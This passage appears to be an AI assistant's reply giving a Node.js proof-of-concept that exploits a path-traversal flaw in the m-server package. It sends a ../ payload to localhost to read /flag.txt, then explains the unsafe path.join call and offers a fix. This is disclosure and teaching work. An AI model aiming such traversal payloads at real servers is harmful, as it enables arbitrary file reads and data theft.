const http = require('http');

// Directly require the library module to instantiate the vulnerable HTTPServer instance.
// In research environments, binding to an explicit port avoids default config collisions.
const { createServer } = require('m-server/lib/index.js');

async function exploit() {
    const PORT = 1337;

    console.log(`[*] Starting vulnerable m-server on port ${PORT}...`);
    // Instantiates the HttpServer constructor defined in lib/index.js
    createServer({ port: PORT });

    return new Promise((resolve, reject) => {
        // Give the OS a moment to bind the TCP socket
        setTimeout(async () => {
            // Payload designed to escape the intended rootPath and resolve to /flag.txt
            // Depth may require tuning based on __dirname vs process.cwd() in your specific testbed.
            const payload = `../../../../../../flag.txt`;

            console.log(`[*] Sending traversal request: GET /${payload}`);

            const req = http.request({
                hostname: '127.0.0.1',
                port: PORT,
                path: `/${payload}`,
                method: 'GET'
            }, (res) => {
                let body = '';
                res.on('data', chunk => body += chunk);
                res.on('end', () => {
                    console.log('\n--- Path Traversal Successfully Demonstrated ---');
                    console.log(`HTTP Status Code: ${res.statusCode}`);
                    console.log(`Extracted File Content:\n${body}`);

                    // Clean shutdown after verification
                    process.exit(0);
                });
            });

            // Deliberately omitting error handling as requested to allow failures to propagate visibly
            req.end();
        }, 1000);
    });
}

await exploit();
```

### Why This Demonstrates the Vulnerability

1. **Unsanitized URL Concatenation**: In `lib/index.js`, the request handler computes the target filesystem path using:
   ```javascript
   var targetPath = path.join(rootPath, req.url);
   ```
   Node.js's `path.join()` concatenates paths but does **not** automatically resolve or strip traversal sequences (`..`). When `req.url` contains `../../../../../../flag.txt`, the joined result escapes the intended `rootPath` boundary.

2. **Missing Input Validation**: The server accepts the raw HTTP request URL without normalizing it (e.g., via `path.normalize()` or verifying the resulting absolute path still resides within `rootPath`). This violates the Principle of Least Privilege and safe path resolution standards for web servers.

3. **Arbitrary File Read Confirmation**: When the payload is sent, the server resolves the escaped path to `/flag.txt`. Because `fs.existsSync(targetPath)` evaluates to `true` (the file exists on the host OS) and `fs.lstatSync(targetPath).isFile()` matches, the server executes:
   ```javascript
   res.end(fs.readFileSync(targetPath))
   ```
   The resulting HTTP `200 OK` response containing the actual contents of `/flag.txt` confirms that attacker-controlled input directly dictated filesystem read location, bypassing all intended directory restrictions.

**Remediation Note for Developers**: 
Replace `path.join(rootPath, req.url)` with a safe path resolution routine that verifies the resolved absolute path still starts with `rootPath`:
```javascript
const normalizedPath = path.resolve(rootPath, req.url.split('?')[0]); // Strip query params if present
if (!normalizedPath.startsWith(path.resolve(rootPath) + path.sep)) {
    res.writeHead(403);
    return res.end('Forbidden');
}
// Proceed serving normalizedPath...
```

